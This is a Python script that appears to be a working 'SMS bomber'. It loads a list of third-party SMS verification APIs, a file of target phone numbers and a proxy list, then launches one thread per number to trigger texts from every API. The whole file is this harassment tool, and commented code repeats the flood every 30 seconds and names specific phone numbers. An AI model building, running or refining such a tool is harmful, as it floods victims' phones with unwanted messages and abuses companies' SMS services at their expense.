# -*- coding: UTF-8 -*-
import json
import requests
import sys
import os
import threading
import random
import time


class Sms_bomb:
    def __init__(self, api_file, phone_file):
        self.count = 0
        api_list = open(api_file, encoding='utf-8')
        self.api_list = json.load(api_list)

        # phone_content = open(phone_file, 'r+', encoding='utf-8')
        self.phone_list = []
        with open(phone_file, 'r', encoding='utf-8') as p:
            for phone in p.read().splitlines():
                # print(phone)
                self.phone_list.append(phone)
        self.ips = []
        with open(os.path.dirname(
                sys.argv[0]) + '/daili.txt', 'r', encoding='utf-8') as f:
            for ip in f.readlines():
                self.ips.append(ip.strip('\n'))

    def set_sms(self, phone):
        # print(self.ips)
        proxy = random.choice(self.ips)
        # print(phone)
        proxies = {
            'http': 'http://' + proxy,
            'https': 'https://' + proxy,
        }
        # print(self.api_list)
        for api in self.api_list:
            url = api.get('api')
            method = api.get('method')
            params = api.get('params')
            params[list(params.keys())[0]] = phone
            params_type = 'params_type' in api.keys()
            if method == 'get':
                response = requests.get(url, params=params)
                print(response.status_code)
                self.count += 1
            else:
                # print(params_type == True)
                if params_type == True:
                    response = requests.post(url, json=params)
                else:
                    response = requests.post(url, params=params)
                print(response.status_code)
                if response.status_code == '200':
                    self.count += 1

    def send_sms(self):
        threads = []
        for phone in self.phone_list:
            #     print(phone)
            t = threading.Thread(
                target=self.set_sms, args=(phone,))
            threads.append(t)
        for t in threads:
            # t.setDaemon(True)
            t.start()


if __name__ == "__main__":
    sms = Sms_bomb(os.path.dirname(
        sys.argv[0]) + '/sms_api.json', os.path.dirname(sys.argv[0]) + '/phone.txt')
    sms.send_sms()
    # for i in range(1, 20):
    #     #     #sms.set_sms('18016387275')
    #     sms.send_sms()
    #     time.sleep(30)

# sms.set_sms('17721213677')
